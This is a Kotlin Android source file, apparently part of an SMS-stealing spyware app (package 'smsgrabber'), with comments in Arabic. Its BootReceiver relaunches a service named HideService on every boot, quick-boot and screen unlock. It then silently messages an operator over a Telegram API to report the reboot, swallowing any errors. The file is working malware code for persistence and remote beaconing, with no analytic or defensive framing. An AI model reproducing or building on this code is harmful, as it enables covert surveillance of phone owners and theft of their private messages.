package com.smsgrabber

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * يعيد تشغيل الخدمة بعد إعادة تشغيل الجهاز
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_USER_PRESENT -> {
                
                // تشغيل الخدمة الخلفية
                val serviceIntent = Intent(context, HideService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }

                // إرسال إشعار بأن الجهاز أعيد تشغيله
                Thread {
                    try {
                        Thread.sleep(5000) // انتظار اتصال الشبكة
                        TelegramApi.sendMessage("🔄 *تنبيه:* تم إعادة تشغيل الجهاز\n🕐 الوقت: ${System.currentTimeMillis()}")
                    } catch (_: Exception) {}
                }.start()
            }
        }
    }
}
